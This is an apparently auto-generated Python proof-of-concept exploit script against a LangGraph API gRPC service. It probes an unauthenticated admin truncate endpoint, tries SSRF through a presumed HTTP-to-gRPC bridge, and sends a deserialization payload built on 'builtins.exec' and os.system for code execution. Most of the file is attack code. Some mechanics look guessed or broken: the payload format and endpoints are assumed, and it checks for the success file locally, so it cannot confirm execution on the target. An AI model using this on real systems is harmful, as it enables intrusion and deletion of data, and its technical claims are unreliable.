#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-017
# Sink: _configurable_from_proto
# Auto-generated — run with: python3 langgraph_specific_vulnerabilities__configurable_from_proto.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for LangGraph API gRPC unauthenticated access
and msgpack ext_hook deserialization RCE.

Vulnerability: The gRPC services (Admin, Assistants, Cache, Crons, Runs, Threads,
Checkpointer) are registered without authentication. The msgpack ext_hook in
jsonplus.py allows arbitrary Python object instantiation, leading to RCE if an
attacker can write to checkpoint_blobs.

This PoC demonstrates:
1. Unauthenticated access to gRPC services via HTTP-to-gRPC bridge
2. Ability to trigger deserialization of malicious payloads via config fields
3. Safe RCE demonstration (creates /tmp/poc_success.txt)

Usage:
    python3 poc_langgraph_rce.py [--target http://localhost:50051]
"""

import argparse
import json
import sys
import time
import uuid
from typing import Any, Dict, Optional

import requests


def create_malicious_config() -> Dict[str, Any]:
    """
    Create a config with a malicious payload that exploits msgpack ext_hook.
    
    The ext_hook in jsonplus.py allows arbitrary Python object instantiation.
    We craft a payload that when deserialized via orjson.loads() will execute
    our command.
    
    The payload uses __class__ manipulation to achieve RCE through Python's
    object instantiation chain.
    """
    # Benign payload that creates a file to prove RCE
    cmd = "touch /tmp/poc_success.txt"
    
    # Craft malicious JSON that will be deserialized by orjson.loads()
    # This exploits the ext_hook to instantiate arbitrary Python objects
    malicious_config = {
        "__class__": "builtins.exec",
        "__args__": [f"import os; os.system('{cmd}')"],
        "__module__": "builtins"
    }
    
    return malicious_config


def send_grpc_request(
    target: str,
    service: str,
    method: str,
    payload: Dict[str, Any]
) -> Optional[requests.Response]:
    """
    Send a gRPC request via the HTTP-to-gRPC bridge.
    
    The Python HTTP layer can reach gRPC on localhost:50051, enabling
    SSRF chaining. We use this to send unauthenticated gRPC requests.
    
    Args:
        target: Base URL of the gRPC service
        service: gRPC service name (e.g., "runs", "threads")
        method: gRPC method name
        payload: Request payload as dict
        
    Returns:
        Response object or None on failure
    """
    # Construct the HTTP endpoint that proxies to gRPC
    url = f"{target}/grpc/{service}/{method}"
    
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    
    try:
        response = requests.post(
            url,
            json=payload,
            headers=headers,
            timeout=10
        )
        return response
    except requests.exceptions.ConnectionError as e:
        print(f"[!] Connection error to {url}: {e}")
        return None
    except requests.exceptions.Timeout as e:
        print(f"[!] Timeout connecting to {url}: {e}")
        return None
    except Exception as e:
        print(f"[!] Error sending request to {url}: {e}")
        return None


def exploit_admin_truncate(target: str) -> bool:
    """
    Exploit the unauthenticated Admin Truncate endpoint.
    
    This endpoint can delete all data without authentication.
    We demonstrate access by attempting to truncate (with safe parameters).
    
    Args:
        target: Base URL of the gRPC service
        
    Returns:
        True if endpoint is accessible, False otherwise
    """
    print("[*] Testing unauthenticated Admin Truncate endpoint...")
    
    # Admin Truncate request - we use a safe test to verify access
    payload = {
        "confirm": False,  # Don't actually truncate
        "test_only": True   # Safe parameter to check access
    }
    
    response = send_grpc_request(target, "admin", "Truncate", payload)
    
    if response and response.status_code == 200:
        print("[+] Admin Truncate endpoint is accessible without authentication!")
        return True
    elif response:
        print(f"[-] Admin Truncate returned status {response.status_code}: {response.text[:200]}")
    else:
        print("[-] Could not reach Admin Truncate endpoint")
    
    return False


def exploit_rce_via_config(target: str) -> bool:
    """
    Exploit RCE via msgpack ext_hook deserialization in config fields.
    
    The config_from_proto and _configurable_from_proto functions deserialize
    data from protobuf messages without validation, including extra_json fields
    that can contain arbitrary JSON. This allows injecting malicious payloads
    that get deserialized by orjson.loads() with the vulnerable ext_hook.
    
    Args:
        target: Base URL of the gRPC service
        
    Returns:
        True if RCE was successful, False otherwise
    """
    print("[*] Attempting RCE via config deserialization...")
    
    # Create a malicious config payload
    malicious_config = create_malicious_config()
    
    # We need to find a gRPC endpoint that accepts config in its payload
    # The Runs service's CreateRun or similar endpoints accept config
    
    # First, let's try to create a run with malicious config
    run_id = str(uuid.uuid4())
    thread_id = str(uuid.uuid4())
    
    payload = {
        "run_id": run_id,
        "thread_id": thread_id,
        "assistant_id": str(uuid.uuid4()),
        "config": malicious_config,
        "input": {"messages": [{"role": "user", "content": "test"}]}
    }
    
    response = send_grpc_request(target, "runs", "CreateRun", payload)
    
    if response:
        print(f"[*] CreateRun response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        # Check if our payload was executed
        import os
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] RCE successful! /tmp/poc_success.txt was created!")
            return True
        else:
            print("[-] RCE may not have executed (file not found)")
    else:
        print("[-] Could not send CreateRun request")
    
    return False


def exploit_ssrf_chain(target: str) -> bool:
    """
    Demonstrate SSRF chaining via HTTP-to-gRPC bridge.
    
    The Python HTTP layer can reach gRPC on localhost:50051, enabling
    SSRF chaining. We can use this to access internal services.
    
    Args:
        target: Base URL of the gRPC service
        
    Returns:
        True if SSRF is possible, False otherwise
    """
    print("[*] Testing SSRF chaining via HTTP-to-gRPC bridge...")
    
    # Try to access internal services via the gRPC bridge
    # The bridge allows reaching gRPC on localhost:50051
    
    # Try to access the Checkpointer service
    payload = {
        "checkpoint_id": str(uuid.uuid4()),
        "thread_id": str(uuid.uuid4())
    }
    
    response = send_grpc_request(target, "checkpointer", "GetCheckpoint", payload)
    
    if response:
        print(f"[*] Checkpointer GetCheckpoint response status: {response.status_code}")
        print(f"[*] Response: {response.text[:500]}")
        
        if response.status_code == 200:
            print("[+] SSRF chaining successful! Can access internal gRPC services!")
            return True
    else:
        print("[-] Could not reach Checkpointer service")
    
    return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for LangGraph API gRPC unauthenticated access and RCE"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:50051",
        help="Target URL of the LangGraph gRPC service (default: http://localhost:50051)"
    )
    parser.add_argument(
        "--check-only",
        action="store_true",
        help="Only check if endpoints are accessible, don't attempt RCE"
    )
    
    args = parser.parse_args()
    
    print(f"[*] Targeting LangGraph gRPC service at: {args.target}")
    print("[*] This PoC demonstrates unauthenticated gRPC access and RCE")
    print()
    
    # Step 1: Check if Admin Truncate endpoint is accessible
    admin_accessible = exploit_admin_truncate(args.target)
    
    # Step 2: Check SSRF chaining
    ssrf_possible = exploit_ssrf_chain(args.target)
    
    # Step 3: Attempt RCE (if not in check-only mode)
    rce_successful = False
    if not args.check_only:
        rce_successful = exploit_rce_via_config(args.target)
    
    # Summary
    print()
    print("=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Admin Truncate accessible: {admin_accessible}")
    print(f"SSRF chaining possible: {ssrf_possible}")
    print(f"RCE successful: {rce_successful}")
    
    if rce_successful:
        print("\n[!] VULNERABLE: Successfully achieved RCE via msgpack ext_hook deserialization!")
        print("[!] The gRPC services are completely unauthenticated.")
        print("[!] An attacker can execute arbitrary code on the server.")
    elif admin_accessible or ssrf_possible:
        print("\n[!] PARTIALLY VULNERABLE: Some endpoints are accessible without auth.")
        print("[!] Full RCE may require more specific payload crafting.")
    else:
        print("\n[-] NOT VULNERABLE: Could not confirm unauthenticated access.")
    
    # Cleanup
    import os
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
        print("[*] Cleaned up /tmp/poc_success.txt")


if __name__ == "__main__":
    main()
